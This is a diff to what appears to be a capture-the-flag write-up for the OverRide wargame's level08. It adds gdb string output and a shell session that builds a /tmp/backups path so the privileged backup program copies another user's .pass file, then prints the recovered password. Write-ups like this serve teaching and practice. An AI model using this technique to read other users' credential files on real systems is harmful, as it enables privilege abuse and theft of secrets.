@@ -267,7 +267,9 @@ Dump of assembler code for function main:
    0x0000000000400c57 <+615>:	retq
 End of assembler dump.
 
-(gdb) x /100s 0x400d57
+(gdb) x /100s 0x400d4c
+0x400d4c:	 "\n"
+0x400d4e:	 "LOG: %s\n"
 0x400d57:	 "Usage: %s filename\n"
 0x400d6b:	 "w"
 0x400d6d:	 "./backups/.log"
@@ -277,3 +279,17 @@ End of assembler dump.
 0x400dab:	 "./backups/"
 0x400db6:	 "ERROR: Failed to open %s%s\n"
 0x400dd2:	 "Finished back up "
+
+*****************************************************************************
+By observing the code source we can see that the program will open and read
+the file we give in argument, and will copy it's content into a newly created
+file. This newly created file needs a strict path available from our current
+directory: /backups/"input". So we need to prepare this path.
+So we will go to /tmp to create the directories forming this path.
+*****************************************************************************
+
+level08@OverRide:~$ cd /tmp
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
